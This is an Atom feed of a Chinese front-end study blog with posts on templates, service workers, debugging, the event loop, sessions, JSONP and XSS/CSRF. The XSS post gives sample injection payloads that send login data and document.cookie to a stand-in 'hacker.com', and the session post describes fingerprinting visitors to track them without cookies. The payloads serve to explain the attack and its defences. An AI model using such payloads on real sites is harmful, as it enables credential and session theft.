<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My Little World</title>
  <subtitle>learn and share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoohannah.github.io/"/>
  <updated>2018-01-04T15:03:09.567Z</updated>
  <id>http://yoohannah.github.io/</id>
  
  <author>
    <name>YooHannah</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>模板引擎前后端优缺点</title>
    <link href="http://yoohannah.github.io/post/knowledge/template.html"/>
    <id>http://yoohannah.github.io/post/knowledge/template.html</id>
    <published>2018-01-04T15:03:15.000Z</published>
    <updated>2018-01-04T15:03:09.567Z</updated>
    
    <content type="html"><![CDATA[<p>模板引擎在后端<br>优点<br>在第一次请求时不需要发送请求数据的的HTTP，加载速度可能会快一些；<br>利于SEO;</p>
<p>缺点<br>前端模板有改动，后端对应的模板页面也要改动；<br>如果页面有复杂JS，前端因为没有数据不方便调试，后端需要使用js进行修改；<br>服务器负载压力大</p>
<p>模板引擎在前端<br>优点<br>前后端分离，后台只需要处理逻辑业务,提供接口，减少服务端压力;<br>前端修改方便；<br>可跨平台，兼容不同后端技术</p>
<p>缺点<br>不利于SEO（搜索引擎无法抓取页面的数据，因为只是模板，没有数据内容）<br>JS有可能被用户禁用，数据安全性低</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;模板引擎在后端&lt;br&gt;优点&lt;br&gt;在第一次请求时不需要发送请求数据的的HTTP，加载速度可能会快一些；&lt;br&gt;利于SEO;&lt;/p&gt;
&lt;p&gt;缺点&lt;br&gt;前端模板有改动，后端对应的模板页面也要改动；&lt;br&gt;如果页面有复杂JS，前端因为没有数据不方便调试，后端需要使用js进行修改
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>ng-src</title>
    <link href="http://yoohannah.github.io/post/knowledge/ngsrc.html"/>
    <id>http://yoohannah.github.io/post/knowledge/ngsrc.html</id>
    <published>2018-01-04T14:47:15.000Z</published>
    <updated>2018-01-04T15:00:23.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ng-src"><a href="#ng-src" class="headerlink" title="ng-src"></a>ng-src</h1><p>img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资源，造成404错误<br>如果使用ng-src = “{ { } }“就会避免以上问题，ng-src会先去执行{ { } },得到资源地址后再去请求资源<br>ng-src 指令确保的 AngularJS 代码执行前不显示图片。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ng-src&quot;&gt;&lt;a href=&quot;#ng-src&quot; class=&quot;headerlink&quot; title=&quot;ng-src&quot;&gt;&lt;/a&gt;ng-src&lt;/h1&gt;&lt;p&gt;img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>service worker</title>
    <link href="http://yoohannah.github.io/post/knowledge/serviceworker.html"/>
    <id>http://yoohannah.github.io/post/knowledge/serviceworker.html</id>
    <published>2018-01-03T14:52:15.000Z</published>
    <updated>2018-01-03T14:55:28.738Z</updated>
    
    <content type="html"><![CDATA[<p>前端与后台代理服务器</p>
<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><p>fetch 事件/方法:service worker向后台发起HTTP请求的方法<br>fetch(url).then()</p>
<p>message事件/方法:页面和service worker之间进行通信的方法;同一页面两个窗口之间通信（web worker线程)<br>postMessage发送消息;message接收消息</p>
<p>caches API:处理缓存</p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>注册 register<br>安装 install<br>激活 activation<br>更新 Update<br>service-worker.js文件更新被浏览器发现后，会进入waitting等待状态，当前页面依旧使用旧文件进行work，<br>直到当前页面关闭，旧版本文件的service worker才会被kill掉，新版本文件的service worker开始接管页面的缓存资源<br>新的service worker一开始接管就会触发activate事件，从而可以做一些上次老版本缓存的工作</p>
<p>缓存的文件发生更新，可以在fetch 的时候，一边检查更新从而更新缓存，一边检查缓存然后fetch新资源给浏览器，<br>通过 promise 的 resolve 特性来决定谁快</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>（https环境）<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">//在项目入口/配置js文件 进行注册</div><div class="line">if (navigator.serviceWorker) &#123;</div><div class="line">    navigator.serviceWorker.register(&apos;service-worker.js&apos;).then(function(registration) &#123;</div><div class="line">        console.log(&apos;service worker 注册成功&apos;);</div><div class="line">    &#125;).catch(function (err) &#123;</div><div class="line">        console.log(&apos;servcie worker 注册失败&apos;)</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//service-worker.js 放在项目根目录下,service worker的执行代码</div><div class="line">var cacheFiles = [ //指定缓存的文件</div><div class="line">    &apos;about.js&apos;,</div><div class="line">    &apos;blog.js&apos;</div><div class="line">];</div><div class="line">self.addEventListener(&apos;install&apos;, function (evt) &#123; //在安装的时候就将指定文件存入cache storage中</div><div class="line">    evt.waitUntil(</div><div class="line">        caches.open(&apos;my-test-cahce-v1&apos;).then(function (cache) &#123; //使用caches api进行缓存操作</div><div class="line">            return cache.addAll(cacheFiles);</div><div class="line">        &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line">//页面fetch 资源时进行过滤</div><div class="line">self.addEventListener(&apos;fetch&apos;, function(event) &#123;</div><div class="line">  event.respondWith(</div><div class="line">    caches.match(event.request) //检查缓存是否有资源</div><div class="line">      .then(function(response) &#123;</div><div class="line">        if (response) &#123; //如果有直接返回</div><div class="line">          return response;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 因为 event.request 流已经在 caches.match 中使用过一次，</div><div class="line">        // 那么该流是不能再次使用的。我们只能得到它的副本，拿去使用。</div><div class="line">        var fetchRequest = event.request.clone();</div><div class="line"></div><div class="line">        // fetch 的通过信方式，得到 Request 对象，然后发送请求</div><div class="line">        return fetch(fetchRequest).then(</div><div class="line">          function(response) &#123;</div><div class="line">            // 检查是否成功</div><div class="line">            if(!response || response.status !== 200 || response.type !== &apos;basic&apos;) &#123;</div><div class="line">              return response;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // 如果成功，该 response 一是要拿给浏览器渲染，而是要进行缓存。</div><div class="line">            // 由于 caches.put 使用的是文件的响应流，一旦使用，</div><div class="line">            // 那么返回的 response 就无法访问造成失败，所以，这里需要复制一份。</div><div class="line">            var responseToCache = response.clone();</div><div class="line"></div><div class="line">            caches.open(CACHE_NAME)</div><div class="line">              .then(function(cache) &#123;</div><div class="line">                cache.put(event.request, responseToCache);</div><div class="line">              &#125;);</div><div class="line"></div><div class="line">            return response;</div><div class="line">          &#125;</div><div class="line">        );</div><div class="line">      &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//service-worker.js文件更新删除之前版本文件缓存的资源</div><div class="line"></div><div class="line">self.addEventListener(&apos;activate&apos;, function(event) &#123;</div><div class="line"></div><div class="line">  var cacheWhitelist = [&apos;v1&apos;];</div><div class="line"></div><div class="line">  event.waitUntil(</div><div class="line">  // 遍历 caches 里所有缓存的 keys 值</div><div class="line">    caches.keys().then(function(cacheNames) &#123;</div><div class="line">      return Promise.all(</div><div class="line">        cacheNames.map(function(cacheName) &#123;</div><div class="line">          if (cacheWhitelist.includes(cacheName)) &#123;</div><div class="line">          // 删除 v1 版本缓存的文件</div><div class="line">            return caches.delete(cacheName);</div><div class="line">          &#125;</div><div class="line">        &#125;)</div><div class="line">      );</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000008050742" target="_blank" rel="external">相关文档</a><br><a href="https://www.villainhr.com/page/2016/09/25/%E5%89%8D%E7%AB%AF%20fetch%20%E9%80%9A%E4%BF%A1" target="_blank" rel="external">fetch 通信</a><br><a href="https://www.villainhr.com/page/2016/08/22/Web%20Worker" target="_blank" rel="external">web worker 语法</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="external">Service Worker API</a></p>
<p>遗留问题：fetch通信headers添加token字段,不生效</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前端与后台代理服务器&lt;/p&gt;
&lt;h2 id=&quot;主要方法&quot;&gt;&lt;a href=&quot;#主要方法&quot; class=&quot;headerlink&quot; title=&quot;主要方法&quot;&gt;&lt;/a&gt;主要方法&lt;/h2&gt;&lt;p&gt;fetch 事件/方法:service worker向后台发起HTTP请求的方法&lt;br&gt;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>调试-fiddler 使用+google</title>
    <link href="http://yoohannah.github.io/post/knowledge/fiddler.html"/>
    <id>http://yoohannah.github.io/post/knowledge/fiddler.html</id>
    <published>2018-01-03T14:47:15.000Z</published>
    <updated>2018-01-03T14:47:23.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="external">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="external">相关链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;fiddler-使用&quot;&gt;&lt;a href=&quot;#fiddler-使用&quot; class=&quot;headerlink&quot; title=&quot;fiddler 使用&quot;&gt;&lt;/a&gt;fiddler 使用&lt;/h1&gt;&lt;p&gt;浏览器向服务器发送请求的拦截器&lt;/p&gt;
&lt;h2 id=&quot;statistic&quot;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于事件循环event-loop</title>
    <link href="http://yoohannah.github.io/post/knowledge/eventloop.html"/>
    <id>http://yoohannah.github.io/post/knowledge/eventloop.html</id>
    <published>2018-01-01T13:47:15.000Z</published>
    <updated>2018-01-01T13:51:45.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="external">相关链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;js单线程&quot;&gt;&lt;a href=&quot;#js单线程&quot; class=&quot;headerlink&quot; title=&quot;js单线程&quot;&gt;&lt;/a&gt;js单线程&lt;/h1&gt;&lt;p&gt;同一时间只干一件事，干完一件事再干下一件事，&lt;br&gt;如果前一个任务耗时很长，后一个任务也得一直等着&lt;/p&gt;
&lt;p&gt;为
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>session 和cookie</title>
    <link href="http://yoohannah.github.io/post/knowledge/session&amp;cookie.html"/>
    <id>http://yoohannah.github.io/post/knowledge/session&amp;cookie.html</id>
    <published>2017-12-28T00:17:15.000Z</published>
    <updated>2017-12-28T00:17:29.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正常情况下身份识别&quot;&gt;&lt;a href=&quot;#正常情况下身份识别&quot; class=&quot;headerlink&quot; title=&quot;正常情况下身份识别&quot;&gt;&lt;/a&gt;正常情况下身份识别&lt;/h1&gt;&lt;p&gt;用户提交登录信息，服务器拿到登录信息进行验证之后，&lt;br&gt;为该用户在session表
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于jsonp</title>
    <link href="http://yoohannah.github.io/post/knowledge/jsonp.html"/>
    <id>http://yoohannah.github.io/post/knowledge/jsonp.html</id>
    <published>2017-11-30T23:57:15.000Z</published>
    <updated>2017-12-01T00:00:51.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">js:</div><div class="line">function callbackFunction(result,methodName)&#123;&#125;</div></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">dataType:&apos;jsonp&apos;,</div><div class="line">data:&apos;id=10&apos;,</div><div class="line">jsonp:&apos;jsonp_callback&apos;,</div><div class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</div><div class="line">success:function(data)&#123;</div><div class="line">//dostuff</div><div class="line">&#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$.get(</div><div class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</div><div class="line">&#123;</div><div class="line">	param: data,  //参数</div><div class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</div><div class="line">  &apos;jsonp&apos;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</div><div class="line">function(data)&#123; //回调函数</div><div class="line">//dosomething</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于jsonp&quot;&gt;&lt;a href=&quot;#关于jsonp&quot; class=&quot;headerlink&quot; title=&quot;关于jsonp&quot;&gt;&lt;/a&gt;关于jsonp&lt;/h1&gt;&lt;p&gt;是一种json数据的使用模式的名称，&lt;br&gt;获取的资料可以是任意js&lt;/p&gt;
&lt;h1 id=&quot;使用&quot;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>XSS 与 CSRF</title>
    <link href="http://yoohannah.github.io/post/knowledge/XSSCSRF.html"/>
    <id>http://yoohannah.github.io/post/knowledge/XSSCSRF.html</id>
    <published>2017-11-30T23:56:15.000Z</published>
    <updated>2017-12-01T00:00:03.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</div><div class="line">//但如果在访问的同时注入攻击代码，如下</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</div><div class="line">//页面代码就会变成</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</div><div class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</div><div class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</div><div class="line"></div><div class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</div><div class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</div><div class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</div><div class="line">document.write(content);</div><div class="line">document.write(&apos;&gt;&apos;);</div><div class="line">//本次代码注入的方式变为访问</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</div><div class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</div><div class="line"></div><div class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</div><div class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</div><div class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</div></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对特殊字符进行encode<br>对富文本进行白名单处理过滤</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数</p>
]]></content>
    
    <summary type="html">
    
